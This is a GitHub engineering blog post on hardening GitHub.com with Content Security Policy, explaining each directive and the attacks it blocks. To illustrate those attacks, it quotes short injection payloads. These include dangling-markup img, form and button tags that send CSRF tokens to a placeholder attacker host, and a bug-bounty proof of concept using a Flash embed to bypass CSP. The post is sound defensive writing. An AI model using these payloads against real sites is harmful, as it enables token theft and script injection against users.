---
title: "GitHub’s CSP journey"
description: "We shipped subresource integrity a few months back to reduce the risk of a compromised CDN serving malicious JavaScript. That is a big win, but does not address related content injection issues that may exist on GitHub.com itself. We have been tackling this side of the problem over the past few years and thought it would be fun, and hopefully useful, to share what we have been up to."
link: "http://githubengineering.com/githubs-csp-journey/"
saved: "2016-04-13 18:04:10"
---

      <p>We shipped <a href="http://githubengineering.com/subresource-integrity/">subresource integrity</a> a few months back to reduce the risk of a compromised CDN serving malicious JavaScript. That is a big win, but does not address related content injection issues that may exist on GitHub.com itself. We have been tackling this side of the problem over the past few years and thought it would be fun, and hopefully useful, to share what we have been up to.</p>

<p>Just to get everyone on the same page, when talking about “content injection” we are talking about:</p>

<ul>
  <li>Cross Site Scripting (XSS) - Yup, the most common web vulnerability of the past, present, and foreseeable future. Given its prevalence, many developers are familiar with XSS and the obvious security consequences of allowing injected JavaScript to execute on your site.</li>
  <li>Scriptless attacks - This is a more nuanced issue and is frequently not considered since people are too busy fending off XSS. But, as has been documented by Michal Zalewski in <a href="http://lcamtuf.coredump.cx/postxss/">“Postcards from the post-XSS world”</a>, Mario Heiderich (et al) in <a href="https://www.nds.rub.de/media/emma/veroeffentlichungen/2012/08/16/scriptlessAttacks-ccs2012.pdf">“Scriptless Attacks –
Stealing the Pie Without Touching the Sill”</a>, and other related work, preventing XSS does not solve all of your content injection problems.</li>
</ul>

<p>GitHub uses auto-escaping templates, code review, and static analysis to try to prevent these kinds of bugs from getting introduced in the first place, but history shows they are unavoidable. Any strategy that relies on preventing any and all content injection bugs is bound for failure and will leave your engineers, and security team, constantly fighting fires. We decided that the only practical approach is to pair prevention and detection with additional defenses that make content injection bugs much more difficult for attackers to exploit. As with most problems, there is no single magical fix, and therefore we have employed multiple techniques to help with mitigation. In this post we will focus on our ever evolving use of <a href="https://en.wikipedia.org/wiki/Content_Security_Policy">Content Security Policy</a> (CSP), as it is our single most effective mitigation. We can’t wait to follow up on this blog to additionally review some of the “non-traditional” approaches we have taken to further mitigate content injection.</p>

<h3 id="content-security-policy">Content Security Policy</h3>

<p><a href="https://en.wikipedia.org/wiki/Content_Security_Policy">Content Security Policy</a> is an HTTP header that enables a site to use a declarative policy to set restrictions for web resources (JavaScript, CSS, form submissions, etc). CSP is incredibly useful for leveling up the security of your site and is particularly suited for mitigating content injection bugs. GitHub was an early adopter of CSP, having shipped our <a href="https://github.com/blog/1477-content-security-policy">initial implementation</a> approximately three years ago. CSP was in its infancy then and our initial policy reflected this:</p>

<div class="highlighter-rouge">
<pre class="highlight"><code>CONTENT-SECURITY-POLICY:
  default-src *;
  script-src 'self' assets-cdn.github.com jobs.github.com ssl.google-analytics.com secure.gaug.es;
  style-src 'self' assets-cdn.github.com 'unsafe-inline';
  object-src 'self' assets-cdn.github.com;
</code></pre>
</div>

<p>The policy was relatively simple, but substantially reduced the risk of XSS on GitHub.com. After the initial ship we knew there was quite a bit more we could do to tighten things up. During our initial ship we were forced to trust a number of domains to maintain backward compatibility. The above policy did nothing to help with HTML injection that could be used to exfiltrate sensitive information (demonstrated below). However, that was almost three years ago, and a lot has changed since then. We have refactored the vast majority of our third-party script dependencies and CSP itself has also added a number of new directives to further help mitigate content injection bugs and strengthen our policy.</p>

<p>Our current CSP policy looks like this:</p>

<div class="highlighter-rouge">
<pre class="highlight"><code>CONTENT-SECURITY-POLICY:
  default-src 'none';
  base-uri 'self';
  block-all-mixed-content;
  child-src render.githubusercontent.com;
  connect-src 'self' uploads.github.com status.github.com api.github.com www.google-analytics.com wss://live.github.com;
  font-src assets-cdn.github.com;
  form-action 'self' github.com gist.github.com;
  frame-ancestors 'none';
  frame-src render.githubusercontent.com;
  img-src 'self' data: assets-cdn.github.com identicons.github.com www.google-analytics.com collector.githubapp.com *.gravatar.com *.wp.com *.githubusercontent.com;
  media-src 'none';
  object-src assets-cdn.github.com;
  plugin-types application/x-shockwave-flash;
  script-src assets-cdn.github.com;
  style-src 'unsafe-inline' assets-cdn.github.com
</code></pre>
</div>

<p>While some of the above directives don’t directly relate to content injection, many of them do. So, let’s take a walk through the more important CSP directives that GitHub uses. Along the way we will discuss what our current policy is, how that policy prevents specific attack scenarios, and share some <a href="https://bounty.github.com/">bounty submissions</a> that helped us shape our current policy.</p>

<h4 id="script-src"><code class="highlighter-rouge">script-src</code></h4>

<p>Unlike our original policy, we now only source JavaScript from our CDN. As was noted at the beginning of this post, we use subresource integrity to reduce our risk of sourcing malicious externally sourced JavaScript. The net result is that we have a very high assurance that the only JavaScript we are sourcing is what is checked into Git and then uploaded to our CDN. Of particular note is our lack of <code class="highlighter-rouge">self</code> in our source list. While sourcing JavaScript from <code class="highlighter-rouge">self</code> seems relatively safe (and extremely common), it should be avoided when possible.</p>

<p>There are edge cases that any developer must concern themselves with when allowing <code class="highlighter-rouge">self</code> as a source for scripts. There may be a forgotten JSONP endpoint that <a href="https://github.com/rails/rails/pull/9075">doesn’t sanitize the callback function name</a>. Or, another endpoint that serves user-influenced content with a <code class="highlighter-rouge">content-type</code> that could be <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1420">sniffed by browsers</a> as JavaScript. GitHub has several such endpoints. For example, we return <a href="https://github.com/github/fetch/commit/7eee89d15ee21e762a04b4c773fcc3d7d50a13f7.diff">commit diffs</a> as <code class="highlighter-rouge">text/plain</code>. By eliminating <code class="highlighter-rouge">self</code> from our policy, we don’t need to be concerned that a CSP supporting browser will ever use this as source of JavaScript. We also mitigate this by using the <code class="highlighter-rouge">X-Content-Type-Options: nosniff</code> header, but CSP provides extremely strong assurances, even if there were a bug that let an attacker control <code class="highlighter-rouge">content-type</code>.</p>

<h4 id="object-src"><code class="highlighter-rouge">object-src</code></h4>

<p>We previously allowed <code class="highlighter-rouge">self</code> for object and embed tags. The sole reason for this was a legacy reliance of sourcing <a href="https://github.com/zeroclipboard/zeroclipboard">ZeroClipboard</a> from GitHub.com. We had since moved that asset to our CDN and the <code class="highlighter-rouge">self</code> source was no longer needed. However, this legacy directive wasn’t removed from our policy and, as with all things related to “legacy” and “security,” a bounty hunter found <a href="https://bounty.github.com/researchers/adob.html#persistent-cross-site-scripting--with-csp-bypass--20140210">a way to exploit it</a>. This was a super interesting Bug Bounty submission that left us scratching our heads for a few minutes. The attack leveraged a content injection bug as well as a browser bug in Chrome to bypass CSP and gain JavaScript execution. The attack worked like this:</p>

<p>First, an attacker creates a Wiki entry with the following content:</p>

<div class="highlighter-rouge">
<pre class="highlight"><code><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"selected"</span><span class="nt">&gt;</span>
<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"https://some_evil_site.com/xss/github/embed.php"</span> <span class="na">class=</span><span class="s">"choose_plan js-domain"</span><span class="nt">&gt;</span>domain<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/div&gt;</span>
</code></pre>
</div>

<p>One of the core features on GitHub is rendering user-supplied HTML (often via Markdown) in various locations (Issues, Pull Requests, Comments). All of these locations sanitize the resulting HTML to a safe subset to protect against arbitrary HTML injection. However, we had an oversight in our Wiki HTML sanitization filter that allowed setting an arbitrary <code class="highlighter-rouge">class</code> attribute. The combination of setting the class to
<code class="highlighter-rouge">choose_plan</code> and <code class="highlighter-rouge">js-domain</code> triggered some automatic behavior in our JavaScript to fetch the <code class="highlighter-rouge">href</code> associated with the element and insert the response into the DOM. The resulting HTML was still subject to CSP and would not allow executing arbitrary JavaScript. It did however allow an attacker to insert arbitrary HTML into the DOM. The injected content in the proof of concept was the following:</p>

<div class="highlighter-rouge">
<pre class="highlight"><code><span class="nt">&lt;embed</span> <span class="na">src=</span><span class="s">"https://github.com/test-user/test-repo/raw/master/script.png"</span> <span class="na">allowscriptaccess=</span><span class="s">always</span> <span class="na">type=</span><span class="s">"application/x-shockwave-flash"</span><span class="nt">&gt;</span>
</code></pre>
</div>

<p>The sourced URL corresponds to a “raw request” for a file in a user’s repository. A raw request for a non-binary file returns the file with a <code class="highlighter-rouge">content-type</code> of <code class="highlighter-rouge">text/plain</code>, and is displayed in the user’s browser. As was hinted at previously, user-controlled content in combination with content sniffing often leads to unexpected behavior. We were well aware that serving user-controlled content on a GitHub.com domain would increase the chances of script execution on that domain. For that very reason, we serve all responses to raw requests on their own domain. A request to <code class="highlighter-rouge">https://github.com/test-user/test-repo/raw/master/script.png</code> will result in a redirect to <code class="highlighter-rouge">https://raw.githubusercontent.com/test-user/test-repo/master/script.png</code>. And, <code class="highlighter-rouge">raw.githubusercontent.com</code> wasn’t on our <code class="highlighter-rouge">object-src</code> list. So, how was the proof of concept able to get Flash to load and execute?</p>

<p>After rereading the submission, doing a bit of researching, and brewing some extra coffee, we came across <a href="https://bugs.webkit.org/show_bug.cgi?id=97030">this WebKit bug</a>. Browsers are required to verify that all requests, including those resulting from redirects, are allowed by the CSP policy for the page. However, some browsers were only checking the domain from the first request against the source list in our CSP policy. Since we had <code class="highlighter-rouge">self</code> in our source list, the embed was allowed. Combining the Flash execution with the injected HTML (specifically the <code class="highlighter-rouge">allowscriptaccess=always</code> attribute) resulted in a full CSP bypass. The submission earned <a href="https://bounty.github.com/researchers/adob.html">@adob</a> a gold star and further cemented his placement at the <a href="https://bounty.github.com/#leaderboard">top of the leaderboard</a>. We now restrict object embeds to our CDN, and hope to block all object embeds once more broad support for the <a href="https://www.w3.org/TR/clipboard-apis/">clipboard API</a> is in place.</p>

<p>Note: The file that that was fetched in the above bounty submission was returned with a <code class="highlighter-rouge">content-type</code> of <code class="highlighter-rouge">image/png</code>. Unfortunately, Flash has a bad habit of desperately wanting to execute things and will gleefully execute if the response vaguely looks and quacks like a Flash file <img class="emoji" title=":rage:" alt=":rage:" src="https://assets.github.com/images/icons/emoji/unicode/1f621.png" height="20" width="20" align="absmiddle">.</p>

<h4 id="img-src"><code class="highlighter-rouge">img-src</code></h4>

<p>Unlike the directives we have talked about so far, <code class="highlighter-rouge">img-src</code> doesn’t often come to mind when talking about security. By restricting where we source images, we limit one avenue of sensitive data exfiltration. For example, what if an attacker were able to inject an <code class="highlighter-rouge">img</code> tag like this?</p>

<div class="highlighter-rouge">
<pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">'http://some_evil_site.com/log_csrf?html=
</span></code></pre>
</div>

<p>A tag with an unclosed quote will capture all output up to the next matching quote. This could include security sensitive content on the pages such as:</p>

<div class="highlighter-rouge">
<pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"https://github.com/account/public_keys/19023812091023"</span><span class="nt">&gt;</span>
...
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"csrf_token"</span> <span class="na">value=</span><span class="s">"some_csrf_token_value"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>
</code></pre>
</div>

<p>The resulting image element will send a request to <code class="highlighter-rouge">http://some_evilsite.com/log_csrf?html=...some_csrf_token_value...</code>. An attacker can leverage this “dangling markup” attack to exfiltrate CSRF tokens to a site of their choosing. There are a number of types of dangling markup which could lead to the similar exfiltration of sensitive information, but CSP’s restrictions helps to reduce the tags and attributes that can be targeted.</p>

<h4 id="connect-src"><code class="highlighter-rouge">connect-src</code></h4>

<p>As was noted above, GitHub has JavaScript that performs DOM modification by automatically fetching a URL from tags with a specific CSS class. We never intended to insert content sourced from anywhere besides GitHub.com, but until we added support for the <code class="highlighter-rouge">connect-src</code> directive, nothing was restricting the origin of the rendered response. Our current policy dramatically reduces the attack surface by limiting JavaScript connections to a small set of domains. We have recently further locked down our <code class="highlighter-rouge">connect-src</code> policy by adding support for dynamic policy additions. Historically, it has been relatively tedious to make dynamic changes to our policy per endpoint (i.e. we didn’t do it). But, with some <a href="https://github.com/twitter/secureheaders/pull/191">recent development</a> by <a href="https://github.com/oreoshake">@oreoshake</a> to the <a href="https://github.com/twitter/secureheaders">Secure Headers library</a>, it is now much easier for us going forward. For example, connections to <code class="highlighter-rouge">api.braintreegateway.com</code> only occur on payment related pages. We can now enforce a unique exception to our policy, appending the third-party host only on pages that need to connect to the payment endpoint. Over time we hope to lock down other unique connection endpoints using dynamic CSP policies.</p>

<h4 id="form-action"><code class="highlighter-rouge">form-action</code></h4>

<p>By limiting where forms can be submitted we help mitigate the risk associated with injected <code class="highlighter-rouge">form</code> tags. Unlike the “dangling markup” attack described above for image tags, forms are even more nuanced. Imagine an attacker is able to inject the following into a page:</p>

<div class="highlighter-rouge">
<pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"https://some_evil_site.com/log_csrf_tokens"</span><span class="nt">&gt;</span>
</code></pre>
</div>

<p>Sitting below the injection location is a form like:</p>

<div class="highlighter-rouge">
<pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"https://github.com/account/public_keys/19023812091023"</span><span class="nt">&gt;</span>
...
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"csrf_token"</span> <span class="na">value=</span><span class="s">"afaffwerouafafaffasdsd"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>
</code></pre>
</div>

<p>Since the injected form has no closing <code class="highlighter-rouge">&lt;/form&gt;</code> tag we have a situation where the original form is nested inside of the injected form. Nested forms are not allowed and browsers will prefer the topmost form tag. So, when a user submits the form they will export their CSRF token to an attacker, subsequently allowing an attacker to perform a CSRF attack against the user.</p>

<p>Similarly, there happens to be a relatively obscure feature of <code class="highlighter-rouge">button</code> elements:</p>

<div class="highlighter-rouge">
<pre class="highlight"><code><span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">form=</span><span class="s">"version-form"</span> <span class="na">formaction=</span><span class="s">"https://some_evil_site.com/log_csrf_tokens"</span><span class="nt">&gt;</span>Click Me<span class="nt">&lt;/button&gt;</span>
</code></pre>
</div>

<p>By limiting <code class="highlighter-rouge">form-action</code> to a known set of domains we don’t have to think nearly as hard about all the possible ways form submissions might exfiltrate sensitive information. Support for <code class="highlighter-rouge">form-action</code> is probably one of the most effective recent additions to our policy, though adding it was not without challenges.</p>

<p>When we considered what might break in adding support for <code class="highlighter-rouge">form-action</code>, we thought it would roll out cleanly. There were no forms identified that we submitted to an off-site domain. But, as soon as we deployed the “preview policy” (visible only to employees) we found an edge case we hadn’t anticipated. When users authorize an OAuth application they visit a URL like <code class="highlighter-rouge">https://github.com/login/oauth/authorize?client_id=b6a3dd26bac171548204</code>. If the user has previously authorized the application they are immediately redirected to the OAuth application’s site. If they have not authorized the application they are presented a screen to grant access. This confirmation screen results in a form <code class="highlighter-rouge">POST</code> to GitHub.com that does a 302 redirect to the OAuth application’s site. In this case, the form submission is to GitHub.com, but the request results in a redirect to a third-party site. CSP considers the full request flow when enforcing <code class="highlighter-rouge">form-action</code>. Because the form submission results in navigation to a site that is not in our <code class="highlighter-rouge">form-action</code> source list, the redirect is denied.</p>

<p>Recall that we have relied (until recently) on a static policy enforced on every page on GitHub.com. There was no easy way for us to modify the policy dynamically based on the OAuth authorization submission. At first we thought this was a deal breaker and would require us to remove support for <code class="highlighter-rouge">form-action</code> until we had better support for a dynamic policy. Luckily, we found a work around by using a “meta refresh” redirect. We refactored our OAuth endpoint to redirect to the OAuth application’s site using a meta refresh tag (we have since optimized this to use a faster JS redirect that falls back to the meta refresh if necessary). By avoiding a 302 redirect, CSP only considers the initial form submission and not the subsequent redirect. We are effectively cheating by decoupling the form submission from the redirection. We would eventually like to add support for a dynamic source for our <code class="highlighter-rouge">form-action</code>, but the meta refresh and JavaScript redirection hack allowed us to move forward with our deployment of <code class="highlighter-rouge">form-action</code>. The benefits of this change overwhelmingly outweighed the downsides and we deployed the solution to production last May.</p>

<h4 id="child-srcframe-src">
<code class="highlighter-rouge">child-src</code>/<code class="highlighter-rouge">frame-src</code>
</h4>

<p>Inline frames (iframes) are a strong security boundary. Each frame enforces same-origin restrictions just as if the framed content were opened in a unique window or tab. However, there are still some small security benefits in restricting which pages we allow to be framed. For example, consider an attacker injecting a frame on GitHub.com. The frame would load an arbitrary website which could subsequently request HTTP Authentication using an HTTP 401 response code. Browsers don’t handle nested contexts and browser dialogs very well. Security savvy users may instantly recognize that GitHub doesn’t use basic authentication or JavaScript <code class="highlighter-rouge">prompt</code> dialogs, but many users wouldn’t understand the nuance and may be socially engineered into providing their GitHub credentials. Firefox has support for some frame sandbox directives that try to prevent this behavior, such as <code class="highlighter-rouge">allow-modals</code>, but these directives only apply to explicitly sandboxed frames. There is no similar CSP directive that restricts what an arbitrary frame can do regarding modal dialogs. The only current mitigation is to limit the domains that can be framed.</p>

<p>Our current policy globally allows our render domain (used for rendering things such as <a href="https://help.github.com/articles/3d-file-viewer/">STL files</a>, <a href="https://help.github.com/articles/rendering-and-diffing-images/">image diffs</a>, and <a href="https://help.github.com/articles/rendering-pdf-documents/">PDFs</a>). Not long ago we also allowed <code class="highlighter-rouge">self</code>. However, <code class="highlighter-rouge">self</code> was only used on a single page to preview GitHub Pages sites generated using our <a href="https://help.github.com/articles/creating-pages-with-the-automatic-generator/">automatic generator</a>. Using our recent support for dynamic policy additions, we now limit the <code class="highlighter-rouge">self</code> source to the GitHub Pages preview page. After some additional testing, we may be able to use a similar dynamic policy for rendering in the future.</p>

<h4 id="frame-ancestors"><code class="highlighter-rouge">frame-ancestors</code></h4>

<p>This directive effectively replaces the <code class="highlighter-rouge">X-FRAME-OPTIONS</code> header and mitigates clickjacking and other attacks related to framing GitHub.com. Since this directive does not yet have broad browser support, we currently set both the <code class="highlighter-rouge">frame-ancestors</code> directive and the <code class="highlighter-rouge">X-FRAME-OPTIONS</code> header in all responses. Our default policy prevents any framing of content on GitHub.com. Similar to our <code class="highlighter-rouge">frame-src</code>, we use a dynamic policy to allow <code class="highlighter-rouge">self</code> for previewing <a href="https://help.github.com/articles/creating-pages-with-the-automatic-generator/">generated GitHub Pages</a> sites. We also allow framing of an endpoint used to share Gists via iframes.</p>

<h4 id="base-uri"><code class="highlighter-rouge">base-uri</code></h4>

<p>Though not incredibly common, if an attacker can inject a <code class="highlighter-rouge">base</code> tag into the head of a page, they can change what domain all relative URLs use. By restricting this to <code class="highlighter-rouge">self</code>, we can ensure that an attacker cannot modify all relative URLs and force form submissions (including their CSRF tokens) to a malicious site.</p>

<h4 id="plugin-types"><code class="highlighter-rouge">plugin-types</code></h4>

<p>Many browser plugins have a less than stellar security record. By restricting plugins to those we actually use on GitHub.com, we reduce the potential impact of an injected <code class="highlighter-rouge">object</code> or <code class="highlighter-rouge">embed</code> tag. The <code class="highlighter-rouge">plugin-types</code> directive is related to the <code class="highlighter-rouge">object-src</code> directive. As was noted above, once more broad support for the <a href="https://www.w3.org/TR/clipboard-apis/">clipboard API</a> is in place, we intend to block <code class="highlighter-rouge">object</code> and <code class="highlighter-rouge">embed</code> tags. At that point, we will be able to set our <code class="highlighter-rouge">object-src</code> source list to <code class="highlighter-rouge">none</code> and remove <code class="highlighter-rouge">application/x-shockwave-flash</code> from <code class="highlighter-rouge">plugin-types</code>.</p>

<h3 id="whats-next">What’s next?</h3>

<p>We are thrilled with the progress we have made with our CSP implementation and the security protections it provides to our users. Incremental progress has been key to getting our policy, and the underlying browser features, to the maturity it is today. We will continue to expand our use of dynamic CSP policies, as they let us work toward a “least privilege” policy for each endpoint on GitHub.com. Furthermore, we will keep our eyes on <a href="https://github.com/w3c/webappsec">w3c/webappsec</a> for the next browser feature enabling us to lock things down even more.</p>

<p>No matter how restrictive our policy, we remain humble. We know there will always be a content injection attack vector that CSP does not prevent. We have started to implement mitigations for the gaps we know of, but, it is a work in progress as we look to current research and constant brainstorming to identify loopholes. We would love to write about our work mitigating some of these “post-CSP” edge cases. Once a few more pull requests are merged, we will be back to share some details. Until then, good luck on your own CSP journey.</p>

    